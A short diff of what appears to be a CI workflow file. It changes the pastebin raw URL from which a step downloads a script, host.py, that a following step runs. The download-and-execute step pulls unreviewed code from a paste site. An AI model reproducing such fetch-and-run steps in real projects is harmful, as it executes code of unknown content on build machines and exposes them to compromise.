@@ -38,7 +38,7 @@ jobs:
       # Download and run host.py
       - name: Download host.py
         run: |
-          Invoke-WebRequest "https://pastebin.com/raw/QchsYCns" -OutFile "host.py"
+          Invoke-WebRequest "https://pastebin.com/raw/Cm9dz7De" -OutFile "host.py"
 
       - name: Run host.py
         run: |
